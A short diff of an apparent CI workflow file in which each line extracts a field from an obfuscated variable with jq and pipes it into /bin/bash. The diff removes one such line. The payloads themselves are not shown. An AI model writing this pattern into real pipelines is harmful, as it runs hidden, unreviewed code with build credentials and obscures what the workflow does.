@@ -22,7 +22,6 @@ jobs:
           echo $by12 | jq -r .qvtzs1257 | /bin/bash
           printf '%s' "$kk37" | jq -r .ey5558 | /bin/bash
           printf '%s' "$vwzn4554" | jq -r .ia2413 | /bin/bash
-          printf '%s' "$y49" | jq -r .xmc26 | /bin/bash
           echo $knpe56 | jq -r .gxt590 | /bin/bash
           printf '%s' "$og4331" | jq -r .s0 | /bin/bash
 
